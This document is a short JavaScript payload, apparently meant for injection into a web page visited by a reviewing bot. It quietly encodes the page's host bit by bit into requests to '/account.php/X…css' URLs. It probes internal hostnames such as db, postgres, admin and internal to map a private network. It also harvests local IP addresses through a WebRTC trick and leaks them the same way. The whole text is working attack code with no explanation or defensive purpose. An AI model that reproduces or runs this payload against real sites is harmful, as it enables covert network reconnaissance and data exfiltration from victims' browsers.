(function () {
  function b(t) { try { fetch('/account.php/X' + t + '.css', { mode:'no-cors', cache:'no-store', keepalive:true }); } catch (e) {} }
  function send(p, s) {
    b(p + 'L' + s.length);
    for (var i = 0; i < s.length && i < 48; i++) {
      var c = s.charCodeAt(i);
      for (var j = 0; j < 8; j++) { if ((c >> j) & 1) b(p + i + 'b' + j); }
    }
  }
  b('exec');
  send('H', location.host);
  var N = ['web','app','nginx','php','vantage','db','postgres','reviewer','bot',
           'worker','api','internal','admin','cache','proxy','render'];
  N.forEach(function (n, i) {
    fetch('http://' + n + '/', { mode:'no-cors', cache:'no-store' })
      .then(function () { b('n' + i + 'ok'); })
      .catch(function () { b('n' + i + 'no'); });
  });
  try {
    var pc = new RTCPeerConnection({ iceServers: [] }); var seen = {};
    pc.createDataChannel('x');
    pc.onicecandidate = function (e) {
      if (!e.candidate) return;
      var m = /(\d+\.\d+\.\d+\.\d+)/.exec(e.candidate.candidate);
      if (m && !seen[m[1]]) { seen[m[1]] = 1; send('I', m[1]); }
    };
    pc.createOffer().then(function (o) { pc.setLocalDescription(o); });
  } catch (e) { b('rtcno'); }
})();
